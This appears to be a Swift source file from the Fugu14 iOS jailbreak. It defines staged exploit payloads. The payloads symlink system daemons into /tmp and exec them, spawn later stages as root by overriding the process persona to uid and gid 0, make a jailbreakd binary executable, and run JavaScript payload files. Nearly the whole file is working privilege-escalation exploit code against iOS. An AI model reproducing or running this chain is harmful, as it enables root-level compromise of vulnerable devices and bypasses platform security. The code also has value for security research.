//
//  closures.swift
//  Fugu14
//
//  Created by Linus Henze.
//  Copyright © 2021 Linus Henze. All rights reserved.
//

//
//  WARNING: ios.py will automatically modify this file
//           Make sure to check that ios.py still works after changing this file!
//

import Foundation
import ClosurePwn
import JailbreakUtils

class SpotlightClosure: PwnClosure {
    func symlinkResource(withName name: String, toPath path: String) throws {
        // Unlink first
        let resourceTmpPath = try pool.getStrRef(path)
        try callCFunc(name: "unlink", arguments: [
            resourceTmpPath
        ]).insertNow()
        
        // Generate symlink call
        let resourceSymlink = try callCFunc(name: "symlink", arguments: [
            .absolute(address: 0x1337),
            resourceTmpPath
        ])
        
        // Find out where the resource is
        let resourceToUTF8 = try invokeWithResult(arguments: [
            .absolute(address: 0),
            try SharedCache.running.offsetOfSelector("UTF8String")
        ], returnLoc: resourceSymlink.invocation.referenceToArgument(0))
        
        let fakeStr = try pool.getNSStrRef("/" + name)
        let resourceAppend = try invokeWithResult(arguments: [
            .absolute(address: 0),
            try SharedCache.running.offsetOfSelector("stringByAppendingString:"),
            fakeStr
        ], returnLoc: resourceToUTF8.invocation.referenceToArgument(0))
        
        let resourceToNSString = try invokeWithResult(arguments: [
            try SharedCache.running.offsetOfObjCClass("NSString"),
            try SharedCache.running.offsetOfSelector("stringWithCString:"),
            .absolute(address: 0)
        ], returnLoc: resourceAppend.invocation.referenceToArgument(0))
        
        let resourceDirname = try callCFunc(name: "dirname", arguments: [
            .absolute(address: 0)
        ], resultStorage: resourceToNSString.invocation.referenceToArgument(2))
        
        // Read address of args from NXArgv and get first argument
        // Write argument to dirname
        let NXArgv = try SharedCache.running.offsetOfPointer(dlsym(dlopen(nil, 0), "NXArgv"))
        let rd = try reader(from: nil, offset: 0, to: resourceDirname.invocation.referenceToArgument(0))
        try reader(from: NXArgv, offset: 0, to: rd.from).deferred.insertNow()
        
        // Insert all the stuff
        rd.deferred.insertNow()
        resourceDirname.insertNow()
        resourceToNSString.insertNow()
        resourceAppend.insertNow()
        resourceToUTF8.insertNow()
        resourceSymlink.insertNow()
    }
    
    override func generatePayload() throws -> ClosureMemoryObject {
        try printStaticString("[Stage1] Creating links")
        
        // Symlink /usr/libexec/keybagd -> /tmp/stage2
        let keybagPath = try pool.getStrRef("/usr/libexec/keybagd")
        let keybagTmpPath = try pool.getStrRef("/tmp/stage2")
        try callCFunc(name: "unlink", arguments: [
            keybagTmpPath
        ]).insertNow()
        try callCFunc(name: "symlink", arguments: [
            keybagPath,
            keybagTmpPath
        ]).insertNow()
        
        // Symlink /usr/libexec/containermanagerd -> /tmp/stage3
        let containerMngrPath = try pool.getStrRef("/usr/libexec/containermanagerd")
        let containerMngrTmpPath = try pool.getStrRef("/tmp/stage3")
        try callCFunc(name: "unlink", arguments: [
            containerMngrTmpPath
        ]).insertNow()
        try callCFunc(name: "symlink", arguments: [
            containerMngrPath,
            containerMngrTmpPath
        ]).insertNow()
        
        // Symlink /bin/ps -> /tmp/stage4
        let psPath = try pool.getStrRef("/System/Library/CoreServices/ReportCrash")
        let psTmpPath = try pool.getStrRef("/tmp/stage4")
        try callCFunc(name: "unlink", arguments: [
            psTmpPath
        ]).insertNow()
        try callCFunc(name: "symlink", arguments: [
            psPath,
            psTmpPath
        ]).insertNow()
        
        // Symlink jailbreakd -> /tmp/jailbreakd
        try symlinkResource(withName: "jailbreakd", toPath: "/tmp/jailbreakd")
        
        // Symlink JS files -> /tmp/<filename>.js
        try symlinkResource(withName: "utils.js", toPath: "/tmp/utils.js")
        try symlinkResource(withName: "setup.js", toPath: "/tmp/setup.js")
        try symlinkResource(withName: "runJailbreakd.js", toPath: "/tmp/runJailbreakd.js")
        
        let argv = try pool.makeMemoryObject(size: 16, data: [
            .init(offset: 0, target: keybagTmpPath),
            .init(offset: 8, target: .absolute(address: 0)),
        ])
        
        try printStaticString("[Stage1] Execv'ing stage2!")
        
        try callCFunc(name: "execv", arguments: [
            keybagTmpPath,
            argv.reference
        ]).insertNow()
        
        try printStaticString("[Stage1] Execv failed!")
        
        let exit = try callCFunc(name: "exit", arguments: [
            .absolute(address: 1337)
        ])
        
        exit.insertNow()
        
        return try super.generatePayload()
    }
}

class KeybagClosure: PwnClosure {
    func simpleSetenv(_ key: String, _ value: String) throws {
        try callCFunc(name: "setenv", arguments: [
            try pool.getStrRef(key),
            try pool.getStrRef(value),
            .absolute(address: 1)
        ]).insertNow()
    }
    
    override func generatePayload() throws -> ClosureMemoryObject {
        try printStaticString("[Stage2] Preparing...")
        
        let attr = try pool.getStrRef("ABCDEFGH")
        try callCFunc(name: "posix_spawnattr_init", arguments: [
            attr
        ]).insertNow()
        try callCFunc(name: "posix_spawnattr_set_persona_np", arguments: [
            attr,
            .absolute(address: 99),
            .absolute(address: 1) // POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE
        ]).insertNow()
        try callCFunc(name: "posix_spawnattr_set_persona_uid_np", arguments: [
            attr,
            .absolute(address: 0)
        ]).insertNow()
        try callCFunc(name: "posix_spawnattr_set_persona_gid_np", arguments: [
            attr,
            .absolute(address: 0)
        ]).insertNow()
        
        let execPath = try pool.getStrRef("/tmp/stage3")
        let execPath4 = try pool.getStrRef("/tmp/stage4")
        
        let argv = try pool.makeMemoryObject(size: 16, data: [
            .init(offset: 0, target: execPath),
            .init(offset: 8, target: .absolute(address: 0)),
        ])
        
        try simpleSetenv("JSC_useGC",         "0")
        try simpleSetenv("JSC_useDollarVM",   "1")
        try simpleSetenv("JAILBREAKD_PATH",   "/tmp/jailbreakd")
        try simpleSetenv("JAILBREAKD_ARG",    "ping")
        try simpleSetenv("JAILBREAKD_CDHASH", "b617f7bf650ac4e3ea7990c01907ad98960ce7c0")
         
        try printStaticString("[Stage2] Launching stage3 as root!")
        
        let pidBuf = try pool.getStrRef("XXXXXXXX")
        let call1 = try callCFunc(name: "posix_spawn", arguments: [
            pidBuf,
            execPath,
            .absolute(address: 0),
            attr,
            argv.reference,
            .absolute(address: 0)
        ])
        
        let environ = try SharedCache.running.offsetOfPointer(dlsym(dlopen(nil, 0), "environ"))
        try reader(from: environ, offset: 0, to: call1.invocation.referenceToArgument(5)).deferred.insertNow()
        call1.insertNow()
        
        try callCFunc(name: "wait", arguments: [
            pidBuf
        ]).insertNow()
        
        try printStaticString("[Stage2] Launching stage4 as root!")
        
        let call2 = try callCFunc(name: "posix_spawn", arguments: [
            pidBuf,
            execPath4,
            .absolute(address: 0),
            attr,
            argv.reference,
            .absolute(address: 0)
        ])
        
        try reader(from: environ, offset: 0, to: call2.invocation.referenceToArgument(5)).deferred.insertNow()
        call2.insertNow()
        
        try callCFunc(name: "wait", arguments: [
            pidBuf
        ]).insertNow()
        
        // Now try to launch jailbreakd as mobile
        let jailbreakdPath = try pool.getStrRef("/tmp/jailbreakd")
        let argvJbd = try pool.makeMemoryObject(size: 16, data: [
            .init(offset: 0, target: jailbreakdPath),
            .init(offset: 8, target: .absolute(address: 0)),
        ])
        
        try printStaticString("[Stage2] Execv'ing jailbreakd!")
        
        // jailbreakd *must* be launched through it's real path
        try callCFunc(name: "realpath", arguments: [
            jailbreakdPath,
            .absolute(address: 0)
        ], resultStorage: argvJbd.reference).insertNow()
        
        let execv = try callCFunc(name: "execv", arguments: [
            jailbreakdPath,
            argvJbd.reference
        ])
        
        try callCFunc(name: "realpath", arguments: [
            jailbreakdPath,
            .absolute(address: 0)
        ], resultStorage: execv.invocation.referenceToArgument(0)).insertNow()
        
        execv.insertNow()
        
        try printStaticString("[Stage2] Execv failed!")
        
        try callCFunc(name: "exit", arguments: [
            .absolute(address: 0xFF)
        ]).insertNow()
        
        return try super.generatePayload()
    }
}

class ContainermngrClosure: PwnClosure {
    override func generatePayload() throws -> ClosureMemoryObject {
        try printStaticString("[Stage3] Chmodding jailbreakd")
        
        let injectPath = try pool.getStrRef("/tmp/jailbreakd")
        
        try callCFunc(name: "chmod", arguments: [
            injectPath,
            .absolute(address: 0o755)
        ]).insertNow()
        
        try callCFunc(name: "exit", arguments: [
            .absolute(address: 1)
        ]).insertNow()
        
        return try super.generatePayload()
    }
}

class PSClosure: GenericJSClosure {
    override func generatePayload() throws -> ClosureMemoryObject {
        try printStaticString("[Stage4] Setting up JavaScript!")
        
        try initJSRuntime(utilsPath: "/tmp/utils.js", setupPath: "/tmp/setup.js")
        
        try printStaticString("[Stage4] Launching JS payload!")
        
        try runJSFile(path: "/tmp/runJailbreakd.js")
        
        try callCFunc(name: "exit", arguments: [
            .absolute(address: 0xFF)
        ]).insertNow()
        
        return try super.generatePayload()
    }
}
